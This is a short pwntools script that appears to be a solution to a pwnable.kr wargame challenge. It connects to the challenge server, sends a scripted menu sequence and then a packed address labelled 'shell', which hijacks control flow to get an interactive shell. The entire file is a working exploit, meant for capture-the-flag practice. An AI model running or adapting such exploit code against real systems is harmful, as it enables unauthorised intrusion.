from pwn import *

io = remote('pwnable.kr', 9004)
shell = 0x8048dbf
for _ in range(4):
    io.sendline(b'1')
for _ in range(4):
    io.sendline(b'3\n3\n2')
io.sendline(p32(shell))
io.interactive()